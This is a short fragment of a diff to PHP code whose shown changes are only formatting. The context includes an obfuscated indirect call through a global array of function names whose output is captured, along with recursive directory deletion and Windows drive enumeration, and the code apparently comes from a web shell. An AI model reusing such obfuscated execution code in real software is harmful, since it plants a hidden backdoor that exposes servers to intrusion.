             @$GLOBALS['fungsi'][16]($in, $out);
             $out = @join("\n", $out);
@@ -1498,9 +1591,9 @@ function unlinkDir($dir)
 {
     $dirs = array($dir);
     $files = array();
-    for ($i = 0;; $i++) {
+    for ($i = 0; ; $i++) {
         if (isset($dirs[$i]))
-            $dir =  $dirs[$i];
+            $dir = $dirs[$i];
         else
             break;
 
@@ -1541,7 +1634,31 @@ function remove_dot($file)
 function windowsDriver()
 {
     $winArr = [
-        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'
+        'A',
+        'B',
+        'C',
+        'D',
+        'E',
+        'F',
+        'G',
+        'H',
+        'I',
+        'J',
+        'K',
+        'L',
+        'M',
+        'N',
+        'O',
+        'P',
+        'Q',
+        'R',
+        'S',
+        'T',
+        'V',
+        'W',
+        'X',
+        'Y',
+        'Z'
     ];
     foreach ($winArr as $winNum => $winVal) {
         if (is_dir($winVal . ":/")) {
